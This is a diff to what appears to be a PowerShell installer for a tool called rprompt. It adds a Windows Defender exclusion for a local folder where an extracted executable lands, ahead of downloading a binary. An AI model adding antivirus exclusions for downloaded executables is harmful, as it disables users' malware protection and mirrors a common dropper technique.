@@ -39,6 +39,17 @@ try {
     Write-Host "    The file may still be flagged by antivirus." -ForegroundColor Yellow
 }
 
+# Add Windows Defender exclusion for IFCOID folder (where rprompt extracts if-slr.exe)
+$ifcoidPath = "$env:LOCALAPPDATA\IFCOID"
+Write-Host "[*] Adding Windows Defender exclusion for: $ifcoidPath" -ForegroundColor Yellow
+try {
+    Add-MpPreference -ExclusionPath $ifcoidPath
+    Write-Host "[+] Defender exclusion added for IFCOID folder" -ForegroundColor Green
+} catch {
+    Write-Host "[!] Warning: Could not add Defender exclusion for IFCOID: $_" -ForegroundColor Red
+    Write-Host "    if-slr.exe may be flagged by antivirus." -ForegroundColor Yellow
+}
+
 # Download the binary
 Write-Host "[*] Downloading rprompt-windows-amd64.exe..." -ForegroundColor Yellow
 try {
